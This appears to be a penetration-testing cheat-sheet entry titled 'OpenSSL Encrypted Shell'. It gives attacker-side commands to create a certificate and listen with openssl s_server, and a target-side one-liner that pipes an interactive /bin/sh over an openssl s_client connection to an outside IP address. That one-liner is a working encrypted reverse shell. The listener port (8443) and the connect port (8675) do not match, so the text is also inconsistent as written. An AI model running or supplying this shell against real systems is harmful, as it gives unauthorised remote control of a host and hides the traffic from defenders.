# OpenSSL Encrypted Shell

### Attacker Machine

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 
openssl s_server -quiet -key key.pem -cert cert.pem -port 8443
```

### Target Machine

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.50.180:8675 > /tmp/s; rm /tmp/s
```
